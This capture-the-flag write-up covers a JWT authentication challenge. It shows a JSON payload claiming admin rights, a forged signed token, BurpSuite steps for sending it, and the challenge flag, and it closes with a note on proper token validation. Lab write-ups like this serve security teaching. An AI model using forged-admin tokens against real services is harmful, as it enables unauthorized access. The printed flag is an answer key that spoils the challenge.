# CTF IDEH Web JWT Challenge - Writeup

## Challenge: Web JWT Challenge
- **Website:** [https://ideh-jwtorg.chals.io/](https://ideh-jwtorg.chals.io/)

## Challenge Steps

### Task Description

- The objective of this challenge is to exploit a JSON Web Token (JWT) vulnerability. Participants need to create a specific payload, generate a token, and then use BurpSuite to send a request that will reveal the flag.

### 1. Create Payload
- Create a JSON payload with the following content:

		```json
		{
		  "nom_utilisateur": "admin",
		  "is_admin": true
		}```

### 2. Generate Token

Use the payload to generate a JWT. The provided token is:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub21fdXRpbGlzYXRldXIiOiJhZG1pbiIsImlzX2FkbWluIjp0cnVlfQ.Tas91qQdzYDImj_wmDpxZYw1EOzCyzDNqEUMy4Plsc
```

### 3. Go to BurpSuite

Navigate to BurpSuite or use your local BurpSuite instance.

### 4. Send Request

In BurpSuite, send a request using the generated token. Analyze the response to find the flag.

The flag for this challenge is:
		```
		IDEH{N0T_S3CUR3_JWT_S3CR3T_ORG!!}
		```

### 5. Challenge Solution

1. Payload Creation: The payload is crafted to impersonate an admin user.

2. Token Generation: The payload is encoded into a JWT using the algorithm specified. The resulting token is used for authentication.

3. BurpSuite Exploitation: Utilizing BurpSuite, participants intercept and modify the request to include the crafted JWT. The server the3. n responds with the flag, which participants extract.



[*] This challenge emphasizes the importance of securely implementing JWTs and highlights the risks associated with inadequate token validation. Participants learn about JWT vulnerabilities and the potential consequences of improper implementation.


Special thanks to CTF IDEH for creating and organizing this challenge.
